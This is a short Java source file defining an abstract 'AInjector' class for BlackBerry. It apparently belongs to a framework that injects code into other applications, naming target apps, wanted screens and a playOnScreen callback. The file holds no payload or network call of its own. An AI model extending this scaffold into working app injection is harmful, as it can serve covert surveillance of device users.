package blackberry.injection.injectors;

import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public abstract class AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Injector", DebugLevel.VERBOSE);
    //#endif
    private UiApplication injectedApp = null;
    
    public abstract String getAppName();
    public abstract String getCodName();
    
    public abstract String[] getWantedScreen();
    
    public abstract void playOnScreen(Screen screen);

    public boolean enabled(){
        return true;
    }
    
    public void setInjectedApp(UiApplication app) {
        //#ifdef DEBUG
        debug.trace("setInjectedApp: INJECTED");
        //#endif
        this.injectedApp = app;
    }

    public UiApplication getInjectedApp() {
        return injectedApp;
    }
    
    public boolean isInjected(){
        return injectedApp!=null;
    }

}
